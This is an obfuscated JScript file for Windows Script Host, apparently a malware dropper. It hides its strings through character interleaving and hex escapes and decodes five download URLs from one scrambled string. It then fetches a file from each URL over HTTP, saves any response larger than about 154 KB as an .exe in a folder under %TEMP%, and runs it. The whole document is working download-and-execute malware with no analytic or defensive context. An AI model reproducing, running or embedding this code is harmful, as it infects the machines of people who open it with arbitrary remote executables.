
function kWVtBttc(KdBBO,nKSesT) {
var SbLb=["\x72\x75\x6E"];
KdBBO[SbLb[0]](nKSesT);
}
function JxrPOhlEO(QYORdjRkLgd) {
var MIdWSbYE = "uETR Ws CLoSAAQ c PkvMzT ri pt RVBGFZXK .S gIKZn he ydjKxf ll".split(" ");
var ZHbWdkiQ = plww(MIdWSbYE[210-209] + MIdWSbYE[238-235] + MIdWSbYE[932-927] + MIdWSbYE[629-623] + MIdWSbYE[425-417] + MIdWSbYE[931-921]+MIdWSbYE[909-897]);
kWVtBttc(ZHbWdkiQ,QYORdjRkLgd);
}
function eAYPcAiHG(lKHPm,avADi,toYgc,EglR) {
var nLuFx = "xBFqoH SBb pt.Shell jNMSdZA Scri yqqR %TE MP% \\ MkbiThpaB".split(" ");
var FHF=((185-184)?"W" + nLuFx[865-861]:"")+nLuFx[549-547];
var Ov = plww(FHF);
return NmJEcMc(Ov,nLuFx[342-336]+nLuFx[256-249]+nLuFx[659-651]);
}
function WMgCpSrw() {
var klfaeUK = "Sc JODUKVd r NTIsPluZd ipting dzeRjom Ywh ile UZsVJevqLwfEBF System XP sCssK Obj nrVZYr ect jLDMiCS".split(" ");
return klfaeUK[0] + klfaeUK[2] + klfaeUK[4] + ".F" + klfaeUK[7] + klfaeUK[9] + klfaeUK[12] + klfaeUK[14];
}
function plww(lIkRd) {
yNvzfFZ = WScript.CreateObject(lIkRd);
return yNvzfFZ
}
function HttH(LbABC,rFjMh) {
LbABC.write(rFjMh);
}
function kgdO(yfTRJ) {
yfTRJ.open();
}
function COtW(QdKUM,mUlYh) {
QdKUM.saveToFile(mUlYh,558-556);
}
function KjIT(Jtboe,TxUTQ,qwNSC) {
Jtboe.open(qwNSC,TxUTQ,false);
}
function tegX(bqzmz) {
if (bqzmz == 935-735){return true;} else {return false;}
}
function PQgN(QAUPv) {
if (QAUPv > 154424-177){return true;} else {return false;}
}
function zmud(YMOON) {
var zVAFy="";
q=(679-679);
while(true) {
if (q >= YMOON.length) {break;}
if (q % (379-377) != (348-348)) {
zVAFy += YMOON.substring(q, q+(400-399));
}
q++;
}
return zVAFy;
}
function CFkA(UWkza) {
var MKZsSptF=["\x73\x65\x6E\x64"];
UWkza[MKZsSptF[0]]();
}
function aVgq(dKXZf) {
return dKXZf.status;
}
function vgVRQ(pXmssZ) {
return new ActiveXObject(pXmssZ);
}
function NmJEcMc(UITW,yBBlM) {
return UITW.ExpandEnvironmentStrings(yBBlM);
}
function KTZikrK(sAap) {
return sAap.responseBody;
}
function DsFoQBSJ(MrG) {
return MrG.size;
}
function WLtyg(uhanUx) {
return uhanUx.position=163-163;
}
var yk="lhkeblZlXoQmoiSsjsziPsrsymiiQtVhGqUqA.7ckoVma/m870HoxZfB8y6?7 fmOoxmIm7yicOaCnFtQa0k4ecfffI.0c2oJmM/58D0ToIZ9Bvy0?u C?Q O?9 c?";
var bu = zmud(yk).split(" ");
var ARgpaN = ". mzwSEU e zAJTvYvy xe oZBy".split(" ");
var u = [bu[0].replace(new RegExp(ARgpaN[5],'g'), ARgpaN[0]+ARgpaN[2]+ARgpaN[4]),bu[1].replace(new RegExp(ARgpaN[5],'g'), ARgpaN[0]+ARgpaN[2]+ARgpaN[4]),bu[2].replace(new RegExp(ARgpaN[5],'g'), ARgpaN[0]+ARgpaN[2]+ARgpaN[4]),bu[3].replace(new RegExp(ARgpaN[5],'g'), ARgpaN[0]+ARgpaN[2]+ARgpaN[4]),bu[4].replace(new RegExp(ARgpaN[5],'g'), ARgpaN[0]+ARgpaN[2]+ARgpaN[4])];
var qOD = eAYPcAiHG("AENx","QPNzZ","ibIaFy","WQEBbiD");
var gmd = vgVRQ(WMgCpSrw());
var tXfhsA = ("hIdYsjo \\").split(" ");
var vQtE = qOD+tXfhsA[0]+tXfhsA[1];
try{
gmd.CreateFolder(vQtE);
}catch(cYmWdB){
};
var Mpr = ("2.XMLHTTP tiXxbTE gKoAW XML ream St ZeHmMtkH AD YnomLdM O kXYl D").split(" ");
var xu = true  , Achb = Mpr[7] + Mpr[9] + Mpr[11];
var mr = plww("MS"+Mpr[3]+(264464, Mpr[0]));
var JLJ = plww(Achb + "B." + Mpr[5]+(586503, Mpr[4]));
var tPo = 0;
var x = 1;
var jzzfyRM = 47972;
var v=tPo;
while (true)  {
if(v>=u.length) {break;}
var Li = 0;
var zMW = ("ht" + " lmDBnDo tp bsyVH NESCeTdS :// zWmOmNA .e RnMKd x zkRVBj e G UIsQRcG E cyaxYGoa T").split(" ");
try  {
var MStek=zMW[749-749]+zMW[896-894]+zMW[517-512];
KjIT(mr,MStek+u[v]+x, zMW[12]+zMW[14]+zMW[16]); CFkA(mr); if (tegX(aVgq(mr)))  {      
kgdO(JLJ); JLJ.type = 1; HttH(JLJ,KTZikrK(mr)); if (PQgN(DsFoQBSJ(JLJ)))  {
Li = 1;WLtyg(JLJ);COtW(JLJ,/*kcOB88CQNs*/vQtE/*rIj182aJCv*/+jzzfyRM+zMW[7]+zMW[9]+zMW[11]); try  {
if (225>23) {
JxrPOhlEO(vQtE+jzzfyRM+/*NRZW24IivB*/zMW[7]+zMW[9]+zMW[11]/*Yv4J67VsKW*/); 
break;
}
}
catch (EJ)  {
}; 
}; JLJ.close(); 
}; 
if (Li == 1)  {
tPo = v; break; 
}; 
}
catch (EJ)  { 
}; 
v++;
}; 

